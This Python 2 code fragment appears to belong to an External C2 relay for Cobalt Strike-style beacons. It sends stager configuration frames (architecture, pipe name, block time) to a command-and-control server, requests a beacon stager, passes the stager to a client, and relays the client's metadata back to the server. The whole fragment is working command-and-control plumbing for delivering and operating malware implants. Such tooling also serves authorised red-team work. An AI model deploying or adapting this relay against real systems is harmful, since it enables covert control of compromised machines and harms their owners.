def configureOptions(sock, arch, pipename, block):
	# This whole function should eventually be refactored into an elaborate forloop so that we can
	#   support additional beacon options down the road
	# send the options
	if args.verbose:
		print commonUtils.color("Configuring stager options")

	beacon_arch = "arch=" + str(arch)
	if args.debug:
		print commonUtils.color(beacon_arch, status=False, yellow=True)
	commonUtils.sendFrameToC2(sock, beacon_arch)

	beacon_pipename = "pipename=" + str(pipename)
	if args.debug:
		print commonUtils.color(beacon_pipename, status=False, yellow=True)
	commonUtils.sendFrameToC2(sock, beacon_pipename)

	beacon_block = "block=" + str(block)
	if args.debug:
		print commonUtils.color(beacon_block, status=False, yellow=True)
	commonUtils.sendFrameToC2(sock, beacon_block)

def requestStager(sock):
	commonUtils.sendFrameToC2(sock, "go")

	stager_payload = commonUtils.recvFrameFromC2(sock)

	return stager_payload

def main(sock):
	# Send options to the external_c2 server
	configureStage.configureOptions(sock, C2_ARCH, C2_PIPE_NAME, C2_BLOCK_TIME)

	if args.debug:
		print commonUtils.color("stager configured, sending 'go'", status=False, yellow=True)

	# Request stager
	stager_payload = configureStage.requestStager(sock)

	if args.debug:
		print (commonUtils.color("STAGER: ", status=False, yellow=True) + "%s") % (stager_payload)

	# Prep stager payload
	if args.verbose:
		print commonUtils.color("Encoding stager payload")
		# Trick, this is actually done during sendData()

	# Send stager to the client
	if args.verbose:
		print commonUtils.color("Sending stager to client")
	commonUtils.sendData(stager_payload)

	# Rrieve the metadata we need to relay back to the server
	if args.verbose:
		print commonUtils.color("Awaiting metadata response from client")
	metadata = commonUtils.retrieveData()

	# Send the metadata frame to the external_c2 server
	if args.verbose:
		print commonUtils.color("Sending metadata to c2 server")
	if args.debug:
		print (commonUtils.color("METADATA: ", status=False, yellow=True) + "%s") % (metadata)
	commonUtils.sendFrameToC2(sock, metadata)

	# Pretend we have error handling, return 0 if everything is Gucci

	return 0